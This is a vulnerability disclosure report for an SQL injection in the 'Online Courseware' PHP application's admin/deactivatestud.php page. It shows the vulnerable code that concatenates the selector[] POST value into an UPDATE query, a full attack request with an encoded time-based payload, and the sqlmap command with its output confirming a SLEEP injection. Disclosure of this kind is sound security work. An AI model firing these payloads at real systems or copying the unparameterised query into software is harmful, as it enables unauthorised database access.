#### BUG_AUTHOR:LIU WEIYU
## Online Courseware - SQL Injection on (admin/deactivatestud.php selector[] parameter) 
### Vendor Homepage:
https://www.sourcecodester.com/php/4818/online-courseware-using-phpmysql.html 
### Version:V1.0
### Tested on: PHP, Apache, MySQL
### Affected Page:
admin/deactivatestud.php 

On this page, selector[] parameter is vulnerable to SQL Injection Attack 
### Source code(pcci/admin/deactivatestud.php):
```
$edittable=$_POST['selector'];
$N = count($edittable);
for($i=0; $i < $N; $i++)
{
	$result = mysqli_query($conn,"UPDATE student SET mem_status='inactive' where id='$edittable[$i]'");
}
```
### Proof of vulnerability(Verify using the sqlmap tool after logining ):
#### Request:
```
POST /onlinecourseware/pcci/admin/deactivatestud.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 130
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=sm0bljsdrcd3r9gqelkfs2sf73
Origin: http://localhost
Referer: http://localhost/onlinecourseware/pcci/admin/student.php
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

bnm=deactivate&selector%5B%5D=22%27and%28select%2Afrom%28select%2Bsleep%280%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%27
```
#### -> sqlmap -r 1.txt (above request package) --batch
### Output:
```
---
Parameter: selector[] (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: bnm=deactivate&selector[]=22' AND (SELECT 3654 FROM (SELECT(SLEEP(5)))hSuj)-- KRzs
---
```
